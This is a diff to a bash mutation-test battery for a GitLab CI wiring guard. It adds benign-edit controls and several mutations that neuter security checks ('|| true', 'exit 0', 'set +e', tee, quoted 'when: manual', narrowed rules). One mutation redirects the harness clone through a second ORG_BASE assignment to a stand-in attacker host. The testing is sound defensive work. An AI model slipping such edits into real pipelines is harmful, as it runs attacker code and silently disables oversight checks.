@@ -95,6 +95,30 @@ mutate() {
   fi
 }
 
+# accept <name> <awk program>: the mirror of mutate(). Some edits are BENIGN and
+# the guard must NOT red them. A guard whose false positives are one flag away is
+# a guard people learn to click past, which is the failure mode the whole file
+# exists to prevent — so the acceptances are tested as hard as the rejections.
+accept() {
+  local name
+  name="$1"
+  local prog
+  prog="$2"
+  local dir
+  dir="${WORK}/a$((PASS + FAIL))"
+  mkdir -p "$dir"
+  seed_scripts "$dir"
+  awk "$prog" "$REAL_CI" > "${dir}/.gitlab-ci.yml"
+  if cmp -s "$REAL_CI" "${dir}/.gitlab-ci.yml"; then
+    report fail "control '${name}' did NOT change the file — the control itself is broken"
+  elif bash "$GUARD" "${dir}/.gitlab-ci.yml" "$dir" >"${dir}/out.log" 2>&1; then
+    report pass "benign edit accepted: ${name}"
+  else
+    report fail "benign edit '${name}' was REJECTED — false positive"
+    cat "${dir}/out.log" >&2
+  fi
+}
+
 mutate "drop the generator include" '
   /^include:/ { skip = 1; next }
   skip && /^[^ \t#]/ { skip = 0 }
@@ -258,6 +282,92 @@ mutate "harness cloned from an undefined variable (origin not pinned to this ser
   { if ($0 ~ /git clone --depth 1/) sub(/\$\{ORG_BASE\}/, "${MIRROR_BASE}"); print }
 '
 
+# SHELL IS LAST-ASSIGNMENT-WINS. The first form of check 11 asked whether SOME
+# assignment of the clone origin derived from a CI_ variable, so appending one
+# line after the honest derivation left it printing "ok  : …itself derived from a
+# CI_ variable in this job" while the privileged runner cloned and executed an
+# attacker's tree. This is the single highest-consequence mutation in the file.
+mutate "a SECOND ORG_BASE= assignment redirects the fetch (last assignment wins)" '
+  { print; if ($0 ~ /^    - ORG_BASE=/) print "    - ORG_BASE=\"https://evil.invalid/attacker\"" }
+'
+
+# --- the mutations that neuter the guard job's INVOCATION rather than the job -
+# Check 9 used to assert only that the CI file NAMED the battery. Naming a script
+# is not running it: each of these leaves the battery mentioned in the file, the
+# job green, and nothing checked. Same neutering class as allow_failure, spelled
+# in shell instead of YAML.
+mutate "the battery invocation short-circuited with || true" '
+  { sub(/- bash scripts\/check-ci-wiring\.test\.sh$/, "- bash scripts/check-ci-wiring.test.sh || true"); print }
+'
+
+mutate "the battery invocation dead behind a leading true ||" '
+  { sub(/- bash scripts\/check-ci-wiring\.test\.sh$/, "- true || bash scripts/check-ci-wiring.test.sh"); print }
+'
+
+mutate "an exit 0 script item above the battery invocation" '
+  { if ($0 ~ /- bash scripts\/check-ci-wiring\.test\.sh$/) print "    - exit 0"; print }
+'
+
+mutate "a set +e above the battery invocation (a failing battery stops failing the job)" '
+  { if ($0 ~ /- bash scripts\/check-ci-wiring\.test\.sh$/) print "    - set +e"; print }
+'
+
+# GitLab does not set pipefail, so the job takes tee's exit status, not the
+# battery's. Tidying a noisy job into a log file is an entirely ordinary edit.
+mutate "the battery piped through tee (the job takes the pipe's last status)" '
+  { sub(/- bash scripts\/check-ci-wiring\.test\.sh$/, "- bash scripts/check-ci-wiring.test.sh | tee wiring.log"); print }
+'
+
+# --- the same neutering edits, one keystroke away from the spellings above ----
+# `when: manual` and `when: "manual"` are identical YAML. Checks 9 and 10 shipped
+# with a bare-word grep, so quoting the scalar retired the guard job and either
+# pen-test job while every check kept printing "ok".
+mutate 'when: "manual" (QUOTED) on the wiring guard job' '
+  /^lint:ci-wiring:/ { print; print "  when: \"manual\""; next }
+  { print }
+'
+
+mutate 'when: "manual" (QUOTED) on pentest:dast' '
+  /^pentest:dast:/ { print; print "  when: \"manual\""; next }
+  { print }
+'
+
+# ...and a rules: set that simply never matches uses no forbidden word at all.
+# "Only lint on tags, to save runner time" retires the guard exactly as
+# `when: manual` does, and is the likelier real-world edit of the two.
+# Both halves of check 9c, INDEPENDENTLY. Removing both rules at once leaves
+# either half able to catch it on its own, so neither half is actually tested —
+# a guard mutation that widened only the merge-request half survived the battery
+# until these two were split out.
+mutate "the guard job's rules: narrowed off MERGE REQUESTS only" '
+  /^lint:ci-wiring:/ { injob = 1 }
+  injob && /^[^ \t#]/ && !/^lint:ci-wiring:/ { injob = 0 }
+  injob && /merge_request_event/ { next }
+  { print }
+'
+
+mutate "the guard job's rules: narrowed off the DEFAULT BRANCH only" '
+  /^lint:ci-wiring:/ { injob = 1 }
+  injob && /^[^ \t#]/ && !/^lint:ci-wiring:/ { injob = 0 }
+  injob && /CI_DEFAULT_BRANCH/ { next }
+  { print }
+'
+
+mutate "the guard job's rules: narrowed off merge requests and the default branch" '
+  /^lint:ci-wiring:/ { injob = 1 }
+  injob && /^[^ \t#]/ && !/^lint:ci-wiring:/ { injob = 0 }
+  injob && /CI_DEFAULT_BRANCH/ { next }
+  injob && /merge_request_event/ { next }
+  { print }
+'
+
+# GitLab's OTHER spelling of allow_failure. The battery exits 1, which is exactly
+# the status this form excuses.
+mutate "allow_failure: exit_codes: on the wiring guard job" '
+  /^lint:ci-wiring:/ { print; print "  allow_failure:"; print "    exit_codes: 1"; next }
+  { print }
+'
+
 # --- leg 4: positive control for the VENDORED branch -------------------------
 # The guard must accept the other legitimate shape (harness vendored at the
 # template's default path, no PENTEST_HARNESS_DIR override), or it is not a
@@ -341,6 +451,63 @@ else
   report fail "the CI_SERVER_* clone shape was rejected — check 11 is over-fitted to \${ORG_BASE}"
   cat "${SERVERVAR}/out.log" >&2
 fi
+
+# --- leg 8: the battery must be more than a file with the right NAME ---------
+# Check 9 used to assert only that the named battery EXISTS on disk. Replacing it
+# with two lines under the same name — no edit to .gitlab-ci.yml at all, so every
+# mutation above is untouched — turned the whole apparatus green. A static check
+# on another script's body is an inherent regress (a determined rewrite always
+# wins); what must not survive is the CHEAPEST spelling of it.
+STUB="${WORK}/battery-stub"
+mkdir -p "${STUB}/scripts"
+cp "$GUARD" "${STUB}/scripts/check-ci-wiring.sh"
+printf '#!/usr/bin/env bash\nexit 0\n' > "${STUB}/scripts/check-ci-wiring.test.sh"
+cp "$REAL_CI" "${STUB}/.gitlab-ci.yml"
+if bash "$GUARD" "${STUB}/.gitlab-ci.yml" "$STUB" >"${STUB}/out.log" 2>&1; then
+  report fail "an 'exit 0' stub under the battery's name was accepted — check 9 is an existence test only"
+else
+  report pass "an 'exit 0' stub under the battery's name is rejected"
+fi
+
+# --- leg 9: benign edits the guard must NOT red ------------------------------
+# Check 5 and check 11 used to anchor BOTH clone arguments to end-of-line, so a
+# trailing `--quiet` — the most ordinary edit imaginable on a noisy clone —
+# produced three FAILs, including "clones nothing" and "'' is not
+# hugmesh-generator", pointing review at a supply-chain problem that was not
+# there. The arguments are parsed positionally now; this control is what keeps
+# them that way.
+accept "a trailing --quiet on the harness clone" '
+  { if ($0 ~ /git clone --depth 1/) sub(/"$/, "\" --quiet"); print }
+'
+
+accept 'a quoted --branch "main" on the harness clone' '
+  { if ($0 ~ /git clone --depth 1/) sub(/--branch main/, "--branch \"main\""); print }
+'
+
+# Check 9c asks that the guard job's rules COVER merge requests and the default
+# branch. A job with no rules: at all covers every pipeline there is, so it must
+# pass — or 9c is not "the guard actually runs", just "the guard has three rules".
+# ...and 9c must accept every spelling that COVERS those pipelines, not just the
+# org's usual one. Reddening `$CI_COMMIT_BRANCH == "main"` would be a false
+# positive of exactly the kind leg 9 exists to catch.
+accept 'the default branch named literally instead of via $CI_DEFAULT_BRANCH' '
+  /^lint:ci-wiring:/ { injob = 1 }
+  injob && /^[^ \t#]/ && !/^lint:ci-wiring:/ { injob = 0 }
+  injob && /CI_DEFAULT_BRANCH/ {
+    print "    - if: $CI_COMMIT_BRANCH == \"main\""
+    next
+  }
+  { print }
+'
+
+accept "the guard job with no rules: at all (it then runs on every pipeline)" '
+  /^lint:ci-wiring:/ { injob = 1 }
+  injob && /^[^ \t#]/ && !/^lint:ci-wiring:/ { injob = 0 }
+  injob && /^  rules:$/ { inrules = 1; next }
+  inrules && /^    - if:/ { next }
+  inrules && !/^    - if:/ { inrules = 0 }
+  { print }
+'
 
 printf '\n%d passed, %d failed\n' "$PASS" "$FAIL"
 [ "$FAIL" -eq 0 ]
